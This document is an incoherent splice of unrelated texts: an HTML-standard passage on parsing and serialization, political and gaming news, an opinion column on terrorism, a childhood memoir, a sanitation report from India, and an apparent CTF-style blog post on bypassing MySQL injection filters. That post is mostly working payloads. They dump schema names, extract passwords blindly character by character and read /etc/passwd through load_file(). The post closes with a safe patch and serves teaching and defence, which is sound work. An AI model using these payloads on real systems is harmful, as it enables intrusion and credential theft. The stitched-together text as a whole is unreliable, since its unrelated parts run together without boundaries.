When the active formatting elements are reconstructed , a b element is created and foster parented , and then the " bbb " Text node is appended to it :
The stack of open elements has on it the elements html , body , table , tbody , and the new b ( again , note that this does n't match the resulting tree ! ) ; the list of active formatting elements has the new b element in it ; and the insertion mode is still " in table body " .
Had the character tokens been only ASCII whitespace instead of " bbb " , then that ASCII whitespace would just be appended to the tbody element .
Finally , the table is closed by a " table " end tag .
This pops all the nodes from the stack of open elements up to and including the table element , but it does n't affect the list of active formatting elements , so the " ccc " character tokens after the table result in yet another b element being created , this time after the table :
12.2.9.4
Scripts that modify the page as it is being parsed
This section is non-normative .
Consider the following markup , which for this example we will assume is the document with URL https://example.com/inner , being rendered as the content of an iframe in another document with the URL https://example.com/outer :
< div id = a > < script > var div = document .
getElementById ( ' a ' ) ; parent .
document .
body .
appendChild ( div ) ; </ script > < script > alert ( document .
URL ) ; </ script > </ div > < script > alert ( document .
URL ) ; </ script >
Up to the first " script " end tag , before the script is parsed , the result is relatively straightforward :
html head body div id = " a " = " # text : script # text : var div = document.getElementById('a' ) ; ⏎ parent.document.body.appendChild(div ) ;
After the script is parsed , though , the div element and its child script element are gone :
They are , at this point , in the Document of the aforementioned outer browsing context .
However , the stack of open elements still contains the div element .
Thus , when the second script element is parsed , it is inserted into the outer Document object .
Those parsed into different Document s than the one the parser was created for do not execute , so the first alert does not show .
Once the div element 's end tag is parsed , the div element is popped off the stack , and so the next script element is in the inner Document :
This script does execute , resulting in an alert that says " https://example.com/inner " .
12.2.9.5
The execution of scripts that are moving across multiple documents
This section is non-normative .
Elaborating on the example in the previous section , consider the case where the second script element is an external script ( i.e. one with a src attribute ) .
Since the element was not in the parser 's Document when it was created , that external script is not even downloaded .
In a case where a script element with a src attribute is parsed normally into its parser 's Document , but while the external script is being downloaded , the element is moved to another document , the script continues to download , but does not execute .
In general , moving script elements between Document s is considered a bad practice .
12.2.9.6 Unclosed formatting elements
This section is non-normative .
The following markup shows how nested formatting elements ( such as b ) get collected and continue to be applied even as the elements they are contained in are closed , but that excessive duplicates are thrown away .
<! DOCTYPE html > < p >< b class = x >< b class = x >< b >< b class = x >< b class = x >< b > X < p > X < p >< b >< b class = x >< b > X < p ></ b ></ b ></ b ></ b ></ b ></ b > X
The resulting DOM tree is as follows :
DOCTYPE : html
html head body p b class = " x " = " b class = " x " = " b b class = " x " = " b class = " x " = " b #text : X⏎ p b class = " x " = " b b class = " x " = " b class = " x " = " b #text : X⏎ p b class = " x " = " b b class = " x " = " b class = " x " = " b b b class = " x " = " b #text : X⏎ p #text : X ⏎
Note how the second p element in the markup has no explicit b elements , but in the resulting DOM , up to three of each kind of formatting element ( in this case three b elements with the class attribute , and two unadorned b elements ) get reconstructed before the element 's " X " .
Also note how this means that in the final paragraph only six b end tags are needed to completely clear the list of active formatting elements , even though nine b start tags have been seen up to this point .
12.3 Serializing HTML fragments
For the purposes of the following algorithm , an element serializes as void if its element type is one of the void elements , or is basefont , bgsound , frame , or keygen .
The following steps form the HTML fragment serialization algorithm .
The algorithm takes as input a DOM Element , Document , or Document Fragment referred to as the node , and returns a string .
This algorithm serializes the children of the node being serialized , not the node itself .
It is possible that the output of this algorithm , if parsed with an HTML parser , will not return the original tree structure .
Tree structures that do not roundtrip a serialize and reparse step can also be produced by the HTML parser itself , although such cases are typically non-conforming .
For instance , if a textarea element to which a Comment node has been appended is serialized and the output is then reparsed , the comment will end up being displayed in the text control .
Similarly , if , as a result of DOM manipulation , an element contains a comment that contains the literal string " --> " , then when the result of serializing the element is parsed , the comment will be truncated at that point and the rest of the comment will be interpreted as markup .
More examples would be making a script element contain a Text node with the text string " </ script > " , or having a p element that contains a ul element ( as the ul element 's start tag would imply the end tag for the p ) .
This can enable cross -site scripting attacks .
An example of this would be a page that lets the user enter some font family names that are then inserted into a CSS style block via the DOM and which then uses the innerHTML IDL attribute to get the HTML serialization of that style element : if the user enters " </style >< script > attack </ script > " as a font family name , innerHTML will return markup that , if parsed in a different context , would contain a script node , even though no script node existed in the original DOM .
For example , consider the following markup : < form id = " outer " >< div ></ form >< form id = " inner " >< input >
This will be parsed into : html head body form id = " outer " = " div form id = " inner " = " input
The input element will be associated with the inner form element .
Now , if this tree structure is serialized and reparsed , the < form id =" inner " > start tag will be ignored , and so the input element will be associated with the outer form element instead .
< html >< head ></ head >< body >< form id = " outer " >< div > < form id = " inner " > < input ></ form ></ div ></ form ></ body ></ html > html head body form id = " outer " = " div input
As another example , consider the following markup : < a >< table >< a >
This will be parsed into : html head body a a table
That is , the a elements are nested , because the second a element is foster parented .
After a serialize - reparse roundtrip , the a elements and the table element would all be siblings , because the second < a > start tag implicitly closes the first a element .
< html >< head ></ head >< body >< a > < a > </ a >< table ></ table ></ a ></ body ></ html > html head body a a table
For historical reasons , this algorithm does not round - trip an initial U+000A LINE FEED ( LF ) character in pre , textarea , or listing elements , even though ( in the first two cases ) the markup being round - tripped can be conforming .
The HTML parser will drop such a character during parsing , but this algorithm does not serialize an extra U+000A LINE FEED ( LF ) character .
For example , consider the following markup : < pre > Hello . </ pre >
When this document is first parsed , the pre element 's child text content starts with a single newline character .
After a serialize - reparse roundtrip , the pre element 's child text content is simply " Hello . " .
Because of the special role of the is attribute in signaling the creation of customized built - in elements , in that it provides a mechanism for parsed HTML to set the element 's is value , we special - case its handling during serialization .
This ensures that an element 's is value is preserved through serialize - parse roundtrips .
When creating a customized built - in element via the parser , a developer uses the is attribute directly ; in such cases serialize - parse roundtrips work fine .
< script > window .
SuperP = class extends HTMLParagraphElement {} ; customElements .
define ( " super-p " , SuperP , { extends : " p " } ) ; </ script > < div id = " container " >< p is = " super - p " > Superb ! </ p ></ div > < script > console .
log ( container .
innerHTML ) ; // <p is =" super-p " > container .
innerHTML = container .
innerHTML ; console .
log ( container .
innerHTML ) ; // <p is =" super-p " > console .
assert ( container .
firstChild instanceof SuperP ) ; </ script >
But when creating a customized built - in element via its constructor or via createElement ( ) , the is attribute is not added .
Instead , the is value ( which is what the custom elements machinery uses ) is set without intermediating through an attribute .
< script > container .
innerHTML = " " ; const p = document .
createElement ( " p " , { is : " super - p " } ) ; container .
appendChild ( p ) ; //
The is attribute is not present in the DOM : console .
assert ( ! p . hasAttribute ( " is " ) ) ; //
But the element is still a super - p : console .
assert ( p instanceof SuperP ) ; </ script >
To ensure that serialize - parse roundtrips still work , the serialization process explicitly writes out the element 's is value as an is attribute : < script > console .
log ( container .
innerHTML ) ; // <p is =" super-p " > container .
innerHTML = container .
innerHTML ; console .
log ( container .
innerHTML ) ; // <p is =" super-p " > console .
assert ( container . firstChild instanceof SuperP ) ; </ script >
Escaping a string ( for the purposes of the algorithm above ) consists of running the following steps :
Replace any occurrence of the " & " character by the string " & " .
Replace any occurrences of the U+00A0 NO - BREAK SPACE character by the string " " .
If the algorithm was invoked in the attribute mode , replace any occurrences of the " " " character by the string " " " .
If the algorithm was not invoked in the attribute mode , replace any occurrences of the " < " character by the string " < " , and any occurrences of the " > " character by the string " > " .
12.4 Parsing HTML fragments
The following steps form the HTML fragment parsing algorithm .
The algorithm takes as input an Element node , referred to as the context element , which gives the context for the parser , as well as input , a string to parse , and returns a list of zero or more nodes .
This is encouraging news - at least , until Joe Lieberman and Olympia Snowe decide they do n't like it .
But if the House Dems pull this off -- national exchange , repeal of the anti-trust exemption and higher subsidies , they might actually come up with a decent plan :
WASHINGTON --
The White House wants to include a national health - insurance exchange in the health bill , which would give House Democrats one of their top remaining demands , according to an official involved in the discussions .
At issue is who would run the new insurance exchanges that would allow consumers to comparison - shop for health coverage .
The House 's version of the health overhaul calls for the federal government to run a single , national exchange , while the Senate 's version would let states run their own exchanges .
President Barack Obama has told House Democrats that he intends to use the Senate bill as the framework for the final legislation .
But the administration is pushing for a handful of House - backed provisions , including the federally run exchange , according to the official .
[...]
Proponents of a federal exchange say state exchanges could have too few enrollees to function well , or might have enrollees who on average are too sick .
Those who favor state exchanges say they would allow for more flexible regulation than one - size - fits - all standards set in Washington .
The White House also is working to increase the amount of the proposed subsidies that would help offset the cost of buying insurance for lower earners .
The administration wants to bring them closer to the House levels , and is exploring with lawmakers how to do that while keeping the price tag around $ 900 billion over a decade , the target set by Mr. Obama .
House leaders are urging the White House to support repealing a decades - old federal antitrust exemption for the insurance industry that is part of its bill but is n't in the Senate 's version .
Rep. Louise M. Slaughter ( D. , N.Y. ) , chairwoman of the House Committee on Rules , said Mr. Obama showed openness to the idea in conversations with House leaders .
Insurers say they are already heavily regulated by states , where antitrust laws mirror federal rules prohibiting price - fixing and collusion .
Fancy shopping for new armor and enchanting components on your iPhone ?
Blizzard is working on giving players access to the World of Warcraft auction house through the WoW Armory , meaning players could soon do their in - game shopping everywhere they go .
Advertisement
The news comes by way of the World of Warcraft forums , with Blizzard poster Bornakk informing players of the new development in a post titled " Update : Auction House & Armory Integration . "
According to the post , a service is now in development that will allow players to access the auction house through the Armory website , as well as the Armory App for the iPhone and iPod Touch .
Once released , it will be the first major MMO player auction house available outside of the game itself , and workplace productivity among World of Warcraft players will drop like a stone .

There are a few things to keep in mind , however .
First , this is a Blizzard service , which means they wo n't release it until they are damn good and ready , and second , as Bornakk points out , elements of the service will be premium - based , which means there is certain functionality you may end up having to pay extra for .
This is a fairly complex service to develop , due in large part to its unprecedented integration with the game , so we do n't have an exact release date yet .
It 's important to note here that certain elements of the service will be premium - based , which we 'll go into more detail on once the service functionality is finalized .
As with all of the services we offer , we plan to integrate the Auction House and Armory in a way that wo n't disrupt the gameplay experience , and we wo n't release it until it meets the quality standards that we 've set for our other features and services .
G/O Media may get a commission Subscribe and Get Your First Bag Free Promo Code AtlasCoffeeDay20
Once the service is finished , it will be a major milestone in MMO development , as well as a major time - sink .
I know how many hours I 've personally spent sitting in the auction house at Ogrimmar , mindlessly flipping through listings , and I 'm not even that hardcore a player .
I imagine many a twink will be outfitted from the comfort of toilets around the world once the service goes live .

ANALYSIS / OPINION :
When a man is apprehended with a cache of weapons , body armor , a map of a military installation and jihadist personal effects , the natural response of most Americans is to assume the situation is terrorist - related .
The Obama administration says otherwise .
Lloyd R. Woodson was arrested Jan. 25 in rural New Jersey .
He had been observed behaving strangely , wearing military - style fatigues and a bulletproof vest .
He had a weapon modified to fire .50 - caliber rounds from beneath his jacket .
He had a hotel room full of weapons and ammunition .
Despite all these warning signs , the immediate response from the government was that this was “ not a terrorism thing . ”
Bureaucratic lack of concern raises a critical question :
If this is not the behavior of a terrorist , what is ?
It ’s not clear what the Obama administration thinks terrorism is , if it thinks it exists at all .
The administration doggedly maintains that political , especially jihadist , violence by individuals with no international linkage is not terrorism .
This definition might come as a surprise to the Unabomber , who for years was the most sought - after terrorist in America .
President Obama ’s knee - jerk response that the Christmas Day bombing plot was not terror - related was probably one of the factors that led Umar Farouk Abdulmutallab to be Mirandized quickly and treated as a criminal suspect .
It should n’t matter that this was a domestic incident ; he is a jihadist warrior , and the aircraft was his battlefield .
The same was the case with Maj. Nidal Malik Hasan , charged with killing 14 persons and wounding 31 in the Fort Hood massacre .
America was assured that Maj .
Hasan had no foreign terrorist links , and he was not charged with committing an act of terrorism .
The Obama administration ’s report on the shooting , released three weeks ago , avoids mentioning radical Islam as a motivating factor in his rampage .
However , both Maj. Hasan and Mr. Abdulmutallab had relationships with Yemeni - American cleric Anwar al - Awlaki , who is a leading member of al Qaeda of the Arabian Peninsula , and Mr. Abdulmutallab was trained by al Qaeda overseas .
Mr. Woodson also may have links to Islamic radicals .
A report by the Northeast Intelligence Network reveals that , according to a member of New Jersey law enforcement , Mr. Woodson ’s personal effects “ not only associate him with ‘ radical Islam , ’ but also with a ‘ militant Islamic group . ’ ” But as the two cases mentioned above indicate , even this would not qualify him as a terrorist under the Obama administration ’s narrow definition .
In his State of the Union address , the president bragged that in 2009 , “ hundreds of al Qaeda ’s fighters and affiliates , including many senior leaders , have been captured or killed - far more than in 2008 . ”
He claims this is a metric of progress .
However , if Taliban leader Mullah Omar gave a State of the Caliphate address , he could make the same claim .
More Coalition forces are being killed in Afghanistan , and Taliban attacks are increasing in size , scope and frequency .
Analysts suggest that Osama bin Laden ’s audiotape released last week signals the potential for future attacks .
An unusually high number of people on no -fly lists are trying to board aircraft .
Increasing casualties and activity on both sides are not metrics of progress ; they are signs that the war is heating up .
According to the Pew Research Center , terrorism ranks slightly below jobs and the economy as a top public priority .
Americans know there is a problem .
Official statements claiming that incidents are not terror - related will not change the fact that they are .
Connect the dots , Mr. President .
The war on terrorism is still on , and it ’s getting hotter .

While participating at some CTF challenges like Codegate10 or OWASPEU10 recently I noticed that it is extremely trendy to build SQL injection challenges with very tough filters which can be circumvented based on the flexible MySQL syntax .
In this post I will show some example filters and how to exploit them which may also be interesting when exploiting real life SQL injections which seem unexploitable at first glance .
For the following examples I ’ll use this basic vulnerable PHP script :
<? php // DB connection $ id = $ _GET [ 'id ' ] ; $ pass = mysql_real_escape_string ($ _GET [ ' pass ' ] ) ; $ result = mysql_query ( " SELECT id , name , pass FROM users WHERE id = $id AND pass = ' $ pass ' " ) ; if ( $data = @mysql_fetch_array ( $ result ) ) echo " Welcome $ {data [ ' name ' ] } " ; ?>
Note : the webapplication displays only the name of the first row of the sql resultset .
Warmup
Lets warm up .
As you can see the parameter “ id ” is vulnerable to SQL Injection .
The first thing you might want to do is to confirm the existence of a SQLi vulnerability :
?id=1 and 1=0-- -
?id=1 and 1=1-- -
You also might want to see all usernames by iterating through limit ( x ) :
?id=1 or 1=1 LIMIT x,1-- -
But usernames are mostly not as interesting as passwords and we assume that there is nothing interesting in each internal user area .
So you would like to know what the table and column names are and you try the following :
?id=1 and 1=0 union select null , table_name , null from information_schema.tables limit 28,1-- -
?id=1 and 1=0 union select null , column_name , null from information_schema.columns where table_name= ' foundtablename '
LIMIT 0,1-- -
After you have found interesting tables and its column names you can start to extract data .
?id=1 and 1=0 union select null , password , null from users limit 1,1-- -
Ok thats enough for warming up .
Whitespaces , quotes and slashes filtered
Of course things are n’t that easy most time .
Now consider the following filter for some extra characters :
if ( preg_match ( '/\s/' , $ id ) ) exit ( ' attack ' ) ; // no whitespaces if ( preg_match ( ' / [ \' " ] /' , $ id ) ) exit ( ' attack ' ) ; // no quotes if ( preg_match ( '/[\/\\\\ ] /' , $ id ) ) exit ( ' attack ' ) ; // no slashes
As you can see above our injections have a lot of spaces and some quotes .
The first idea would be to replace the spaces by /*comments * / but slashes are filtered .
Alternative whitespaces are all catched by the whitespace filter .
But luckily because of the flexible MySQL syntax we can avoid all whitespaces by using parenthesis to seperate SQL keywords ( old but not seen very often ) .
?id=( 1) and(1) =( 0)union ( select( null ) , table_name , (null ) from(information_schema.tables ) limit 28,1-- -)
Looks good , but still has some spaces at the end .
So we also use group_concat ( ) because LIMIT requires a space and therefore ca n’t be used anymore .
Since all table names in one string can be very long , we can use substr ( ) or mid( ) to limit the size of the returning string .
As SQL comment we simply take “ # ” ( not urlencoded for better readability ) .
?id=(1) and(1) =(0)union( select( null ) , mid( group_concat(table_name),600,100 ) , ( null ) from(information_schema.tables ) ) #
Instead of a quoted string we can use the SQL hex representation of the found table name :
?id=(1) and(1) =(0)union( select(null ) , group_concat(column_name ) , ( null ) from(information_schema.columns)where(table_name ) =( 0x7573657273 ) ) #
Nice .
Basic keywords filtered
Now consider the filter additionally checks for the keywords “ and ” , “ null ” , “ where ” and “ limit ” :
if ( preg_match ( '/\s/' , $ id ) ) exit ( ' attack ' ) ; // no whitespaces if ( preg_match ( ' / [ \' " ] /' , $ id ) ) exit ( ' attack ' ) ; // no quotes if ( preg_match ( '/[\/\\\\ ] /' , $ id ) ) exit ( ' attack ' ) ; // no slashes if ( preg_match ( '/( and|null|where|limit ) / i' , $ id ) ) exit ( ' attack ' ) ; // no sqli keywords
For some keywords this is still not a big problem .
Something most of you would do from the beginning anyway is to confirm the SQLi with the following injections leading to the same result :
?id=1 #
?id=2-1#
To negotiate the previous resultset you can also use a non-existent id like 0 .
Instead of the place holder “ null ” we can select anything else of course because it is only a place holder for the correct column amount .
So without the WHERE we have :
?id=(0)union ( select(0 ) , group_concat( table_name ) , (0 ) from( information_schema.tables ) ) #
?id=(0)union ( select(0 ) , group_concat( column_name ) , (0 ) from( information_schema.columns ) ) #
This should give us all table and column names .
But the output string from group_concat ( ) gets very long for all available table and column names ( including the columns of the mysql system tables ) and the length returned by group_concat ( ) is limited to 1024 by default .
While the length may fit for all table names ( total system table names length is about 900 ) , it definitely does not fit for all available column names because all system column names concatenated already take more than 6000 chars .
WHERE alternative
The first idea would be to use ORDER BY column_name DESC to get the user tables first but that does n’t work because ORDER BY needs a space .
Another keyword we have left is HAVING .
First we have a look which databases are available :
?id=(0)union ( select(0 ) , group_concat( schema_name ) , (0 ) from( information_schema.schemata ) ) #
This will definitely fit into 1024 chars , but you can also use database ( ) to get the current database name :
?id=(0)union ( select(0 ) , database ( ) , ( 0 ) ) #
Lets assume your database name is “ test ” which hex representation is “ 0x74657374 ” .
Then we can use HAVING to get all table names associated with the database “ test ” without using WHERE :
?id=(0)union(select(table_schema ) , table_name,(0 ) from( information_schema.tables ) having (( table_schema)like(0x74657374 ) ) ) #
Note that you have to select the column “ table_schema ” in one of the place holders to use this column in HAVING .
Since we assume that the webapp is designed to return only the first row of the result set , this will give us the first table name .
The second table name can be retrieved by simply excluding the first found table name from the result :
?id=(0)union(select(table_schema ) , table_name,(0 ) from( information_schema.tables ) having (( table_schema)like(0x74657374 ) &&( table_name ) !=( 0x7573657273 ) ) ) #
We use && as alternative for the filtered keyword AND ( no urlencoding for better readability ) .
Keep excluding table names until you have them all .
Then you can go on with exactly the same technique to get all column names :
?id=(0)union(select( table_name ) , column_name,(0 ) from( information_schema.columns)having (( table_name ) like(0x7573657273 ) ) ) #
?id=(0)union(select( table_name ) , column_name,(0 ) from(information_schema.columns)having (( table_name ) like( 0x7573657273 ) &&( column_name )!=( 0x6964 ) ) ) #
Unfortunately you ca n’t use group_concat ( ) while using HAVING hence the excluding step by step .
intermediate result
What do we need for our injections so far ?
keywords : “ union ” , “ select ” , “ from ” , ” having ”
characters : ( ) , ._# ( & or “ and ” )
String comparing characters like “ = ” and “ != ” can be avoided by using the keywords “ like ” and “ rlike ” or the function strcmp ( ) together with the keyword “ not ” :
?id=(0)union(select( table_name ) , column_name,(0 ) from(information_schema.columns)having (( table_name ) like( 0x7573657273) and( NOT (( column_name) like(0x6964 ) ) ) ) ) #
advanced keyword filtering
Now its getting difficult .
The filter also checks for all keywords previously needed :
if ( preg_match ( '/\s/' , $ id ) ) exit ( ' attack ' ) ; // no whitespaces if ( preg_match ( ' / [ \' " ] /' , $ id ) ) exit ( ' attack ' ) ; // no quotes if ( preg_match ( '/[\/\\\\ ] /' , $ id ) ) exit ( ' attack ' ) ; // no slashes if ( preg_match ( '/( and|or|null|where|limit ) / i' , $ id ) ) exit ( ' attack ' ) ; // no sqli keywords if ( preg_match ('/(union|select|from|having ) /i' , $ id ) ) exit ( ' attack ' ) ; // no sqli keywords
What option do we have left ?
If we have the FILE privilege we can use load_file ( ) ( btw you ca n’t use into outfile without quotes and spaces ) .
But we ca n’t output the result of load_file ( ) because we can not use union select so we need another way to read the string returned by the load_file ( ) .
First we want to check if the file can be read .
load_file ( ) returns “ null ” if the file could not be read , but since the keyword “ null ” is filtered we cant compare to “ null ” or use functions like isnull ( ) .
A simple solution is to use coalesce ( ) which returns the first not - null value in the list :
?id=(coalesce(length(load_file(0x2F6574632F706173737764 ) ) , 1 ) )
This will return the length of the file content or – if the file could not be read – a “ 1 ” and therefore the success can be seen by the userdata selected in the original query .
Now we can use the CASE operator to read the file content blindly char by char :
?id=(case(mid(load_file(0x2F6574632F706173737764 ) , $x,1 ) ) when ( $ char ) then ( 1 ) else ( 0 ) end )
( while $ char is the character in sql hex which is compared to the current character of the file at offset $ x )
We bypassed the filter but it requires the FILE privilege .
filtering everything
Ok now we expand the filter again and it will check for file operations too ( or just assume you do n’t have the FILE privilege ) .
We also filter SQL comments .
So lets assume the following ( rearranged ) filter :
if ( preg_match ( '/\s/' , $ id ) ) exit ( ' attack ' ) ; // no whitespaces if ( preg_match ( ' / [ \' " ] /' , $ id ) ) exit ( ' attack ' ) ; // no quotes if ( preg_match ( '/[\/\\\\ ] /' , $ id ) ) exit ( ' attack ' ) ; // no slashes if ( preg_match ( '/( and|or|null|not ) / i' , $ id ) ) exit ( ' attack ' ) ; // no sqli boolean keywords if ( preg_match ('/(union|select|from|where ) /i' , $ id ) ) exit ( ' attack ' ) ; // no sqli select keywords if ( preg_match ( '/( group|order|having|limit ) /i' , $ id ) ) exit ( ' attack ' ) ; // no sqli select keywords if ( preg_match ( '/( into|file|case ) / i' , $ id ) ) exit ( ' attack ' ) ; // no sqli operators if ( preg_match ( '/(-- |#|\/\*)/' , $ id ) ) exit ( ' attack ' ) ; // no sqli comments
The SQL injection is still there but it may look unexploitable .
Take a breath and have a look at the filter .
Do we have anything left ?
We cant use procedure analyse ( ) because it needs a space and we cant use the ‘ 1 ’ % ’0 ′ trick .
Basically we only have special characters left , but that is often all we need .
We need to keep in mind that we are already in a SELECT statement and we can add some conditions to the existing WHERE clause .
The only problem with that is that we can only access columns that are already selected and that we do have to know their names .
In our login example they should n’t be hard to guess though .
Often they are named the same as the parameter names ( as in our example ) and in most cases the password column is one of {password , passwd , pass , pw , userpass} .
So how do we access them blindly ?
A usual blind SQLi would look like the following :
?id=( case when ( mid ( pass , 1,1 ) ='a ' ) then 1 else 0 end )
This will return 1 to the id if the first char of the password is ‘ a ’ .
Otherwise it will return a 0 to the WHERE clause .
This works without another SELECT because we dont need to access a different table .
Now the trick is to express this filtered CASE operation with only boolean operators .
While AND and OR is filtered , we can use the characters && and || to check , if the first character of the pass is ‘ a ’ :
?id=1&&mid( pass,1,1 ) =( 0x61 ) ;%00
We use a nullbyte instead of a filtered comment to ignore the check for the right password in the original sql query .
Make sure you prepend a semicolon .
Nice , we can now iterate through the password chars and extract them one by one by comparing them to its hex representation .
If it matches , it will show the username for id=1 and if not the whole WHERE becomes untrue and nothing is displayed .
Also we can iterate to every password of each user by simply iterating through all ids :
?id=2&&mid( pass,1,1 ) =( 0x61 ) ;%00
?id=3&&mid( pass,1,1 ) =( 0x61 ) ;%00
Of course this takes some time and mostly you are only interested in one specific password , for example of the user “ admin ” but you dont know his id .
Basically we want something like :
?id=( SELECT id FROM users WHERE name = ' admin ' ) && mid( pass , 1,1 ) = ( ' a ' ) ;
%00
The first attempt could be :
?id=1||1=1&&name=0x61646D696E&&mid(pass,1,1)=0x61;%00
That does not work because the “ OR 1=1 ” at the beginning is stronger than the “ AND ” s so that we will always see the name of the first entry in the table ( it gets more clearly wenn you write the “ OR 1=1 ” at the end of the injection ) .
So what we do is we compare the column id to the column id itself to make our check for the name and password independent of all id’s :
?id=id&&name=0x61646D696E&&mid( pass,1,1) =0x61;%00
If the character of the password is guessed correctly we will see “ Hello admin ” – otherwise there is displayed nothing .
With this we have successfully bypassed the tough filter .
filtering everything and even more
What else can we filter to make it more challenging ?
Sure , some characters like “ = ” , “ | ” and “ & ” .
if ( preg_match ( '/\s/' , $ id ) ) exit ( ' attack ' ) ; // no whitespaces if ( preg_match ( ' / [ \' " ] /' , $ id ) ) exit ( ' attack ' ) ; // no quotes if ( preg_match ( '/[\/\\\\ ] /' , $ id ) ) exit ( ' attack ' ) ; // no slashes if ( preg_match ( '/( and|or|null|not ) / i' , $ id ) ) exit ( ' attack ' ) ; // no sqli boolean keywords if ( preg_match ('/(union|select|from|where ) /i' , $ id ) ) exit ( ' attack ' ) ; // no sqli select keywords if ( preg_match ( '/( group|order|having|limit ) /i' , $ id ) ) exit ( ' attack ' ) ; // no sqli select keywords if ( preg_match ( '/( into|file|case ) / i' , $ id ) ) exit ( ' attack ' ) ; // no sqli operators if ( preg_match ( '/(-- |#|\/\*)/' , $ id ) ) exit ( ' attack ' ) ; // no sqli comments if ( preg_match ( ' /( = |&|\| ) / ' , $ id ) ) exit ( ' attack ' ) ; // no boolean operators
Lets see .
The character “ = ” should n’t be problematic as already mentioned above , we simply use “ like ” or “ regexp ” etc . :
?id=id&&( name ) like(0x61646D696E ) &&( mid ( pass , 1,1 ) ) like( 0x61 ) ;%00
The character “ | ” is n’t even needed .
But what about the “ & ” ?
Can we check for the name= ’ admin ’ and for the password characters without using logical operators ?
After exploring all sorts of functions and comparison operators I finally found the simple function if ( ) .
It basically works like the CASE structure but is a lot shorter and ideal for SQL obfuscation / filter evasion .
The first attempt is to jump to the id which correspondents to the name = ‘ admin ’ :
?id=if(( name ) like( 0x61646D696E ) , 1,0 ) ;
%00
This will return 1 , if the username is admin and 0 otherwise .
Now that we actually want to work with the admin ’s id we return his id instead of 1 :
?id=if(( name ) like(0x61646D696E ) , id,0 ) ;
%00
Now the tricky part is to not use AND or && but to also check for the password chars .
So what we do is we nest the if clauses .
Here is the commented injection :
?id= if ( // if ( it gets true if the name= ' admin ' ) if (( name ) like( 0x61646D696E ) , 1,0 ) , // then ( if first password char= ' a ' return admin id , else 0 ) if ( mid ( ( password ) , 1,1 ) like ( 0x61 ) , id,0 ) , // else ( return 0 ) 0 ) ;%00
Injection in one line :
?id=if(if( ( name ) like(0x61646D696E ) , 1,0 ) , if ( mid ( ( password ) , 1,1 ) like ( 0x61 ) , id,0 ) ,0 ) ;
%00
Again you will see “ Hello admin ” if the password character was guessed correctly and otherwise you ’ll see nothing ( id=0 ) .
Sweet !
Conclusion
( My ) SQL is n’t as flexible as Javascript , thats for sure .
The main difference is that you ca n’t obfuscate keywords because there is nothing like eval ( ) ( as long as you do n’t inject into stored procedures ) .
But as shown in this article there is n’t much more needed than some characters ( mainly parenthesis and commas ) to not only get a working injection but also to extract data or read files .
Various techniques also have shown that detecting and blocking SQL injections based on keywords is not reliable and that exploiting those is just a matter of time .
If you have any other clever ways for bypassing the filters described above please leave a comment .
What about additionally filtering “ if ” too ?
Edit :
Because there has been some confusion : you should NOT use the last filter for securing your webapp .
This post shows why it is bad to rely on a blacklist .
To secure your webapp properly , typecast expected integer values and escape expected strings with mysql_real_escape_string ( ) , but do n’t forget to embed the result in quotes in your SQL query .
Here is a safe patch for the example :
$ id = ( int ) $ _GET [ 'id ' ] ; $ pass = mysql_real_escape_string ($ _GET [ ' pass ' ] ) ; $ result = mysql_query ( " SELECT id , name , pass FROM users WHERE id = $ id AND pass = ' $ pass ' " ) ;

Sick of the endless stream of mini game shovelware infesting the Wii game library ?
According to reports , you 're not the only one .
Both Best Buy and Target allegedly share your views , and have grown so tired of cheap waggle crap that they are refusing to stock such games .
A Gamasutra article states that the two retail chains are telling publishers to not even bother approaching them with mini game compilations because they will be turned away at the door .
While this will do little to dampen the Wii's unfortunate reputation as a dumping ground for awful videogames , it 's still great to see that such lazy , cheap , insulting crap has saturated itself out of profit .
That said , some titles , like that terrible Carnival Games , still manage to inexplicably make money , so we 'll have to see just how rigid Best Buy and Target remain on this moratorium .

I was very lucky to live in China during the early 80's when I was a little kid .
China was heavily communist and there were very few westerners , we were often the first white people locals had ever seen .
When we went to the market ( After a couple of hours on a bus ) hundreds of people would queue up to touch my brothers hair ( which is bright red - especially lucky ! ) .
I am reading the book Getting Rich First in a Changing China , it makes me sad to realise how many old treasures are lost .
But innovation always shines through .
I remember drinking a bottle of coke cola in little shack bar in the middle of communist China in early 80's , now that is ingenuity - the bar was made of found bits and pieces !
How the coke got there I will never know .
She grew up in a dusty West Bengal village , where no one had access to toilets .
Most of the female villagers headed to a particular field .
But it was a bit of a walk and often required asking another woman to help shield you from lecherous men .
Boko , a 35 - year - old woman with a yellow sari and a big smile , now sweeps floors at a truck stop with toilets .
It ’s a big improvement , says the woman , who identified herself only by her first name .
A United Nations report released March 15 says that despite progress in the last two decades , 2.4 billion people around the world still lack access to basic sanitary facilities -- including an estimated 638 million in India alone .
Lacking access to a toilet , something most people in the developed world do n’t think about , involves more than just embarrassment and inconvenience .
It ’s also a significant health hazard .
Globally , about 1.5 million children die each year as a result of a lack of water , sanitation and hygiene , according to UNICEF , the U.N. children ’s agency .
“ We go to the toilet on the street , ” said Basarat Ansari , 30 , a homeless laborer working in a ritzy Kolkata neighborhood .
“ I know other people have to walk in it .
But you do n’t have much choice if you have to go . ”
Women often have a harder time .
Chandana Das , 40 , sat cooking a curry on a Kolkata street where she has lived for years .
Nearby , a string of men used a green tiled urinal in open view .
“ Men can go over there , but we ca n’t very well do that , ” Das said .
“ I ’ll walk several blocks to a toilet at the market .
You have to pay , but what can you do ? ”
Up to 10 % of Kolkata ’s population lives on the street or in shantytowns -- including rickshaw pullers , migrants from neighboring states and illegal immigrants from Bangladesh .
That means many people end up sleeping near where someone else has defecated a few hours earlier .
An estimated three dozen civic groups and neighborhood committees offer public toilets -- only enough so that there are about two per square mile in a teeming city of 15 million .
One such group , Sulabh International , operates 7,500 toilets across the country , in nearly every Indian state , and employs 50,000 people .
But founder Bindeshwar Pathak said Sulabh ’s effort is “ just like a peanut , ” compared with India ’s needs , which he estimates at 1 million public toilets and 120 million household toilets .
Though the problem in cities is often more acute , globally 70 % of those without toilets live in rural areas .
In India , parents often wo n’t allow their daughters who have reached puberty to attend rural schools that lack toilets , fearing they will be molested , which would ruin their chances of attracting a suitor .
That makes toilets a linchpin in efforts to improve women ’s status .
Some blame the state for the dearth of public facilities .
“ If officials spent even 10 % of our tax money where they should , we ’d be a far more developed country , ” said Gourav Ghosh , 24 , a hotel developer in Kolkata , formerly known as Calcutta .
“ But it seeps away from corruption .
Before an election , the toilets are maintained .
Afterwards , it ’s back to usual -- filth and disrepair .
Inevitably , it ’s poor people who suffer . ”
Others blame a lack of civic pride .
It ’s not unusual to see men , including well - dressed businessmen , urinating on a wall just beside a public toilet to avoid the smell and filth inside .
New Delhi has vowed to clean up in time for the Commonwealth Games it is hosting this fall .
